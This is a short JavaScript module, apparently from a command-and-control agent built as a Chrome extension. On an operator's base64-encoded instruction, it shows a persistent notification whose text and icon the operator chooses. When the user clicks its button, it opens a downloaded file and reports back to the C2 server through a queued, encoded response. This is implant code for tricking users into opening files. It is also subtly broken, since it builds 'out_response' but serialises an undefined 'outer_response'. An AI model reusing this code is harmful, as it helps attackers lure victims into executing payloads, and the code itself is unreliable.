opendownload = function(task) {
    let args = JSON.parse(atob(task.parameters.toString()));
    const id = Math.round(args.downloadid);
    let icon = chrome.extension.getURL(args.iconURL);
    let message = args.message;
    let buttonText = args.buttonText;
    let title = args.title;
    let buttons = [{"title": buttonText}];
    let options = { type: "basic", iconUrl: icon, title: title, message: message, requireInteraction: true, buttons: buttons };
    chrome.notifications.create(options, function(notificationID) {
        chrome.notifications.onButtonClicked.addListener(function(notificationIDa, bIndex) {
            if(notificationID === notificationIDa) {
                chrome.downloads.open(id);
                let response = {'task_id':task.id, 'completed': true, 'user_output': 'opened download with ID: ' + id};
                let out_response = {'action':'post_response', 'responses':[response], 'delegates':[]};
                let enc = JSON.stringify(outer_response);
                let final = apfell.apfellid + enc;
                let msg = btoa(unescape(encodeURIComponent(final)));
                out.push(msg);
            }
        });
    });
};

C2.commands[opendownload.name] = opendownload;
COMMAND_ENDS_HERE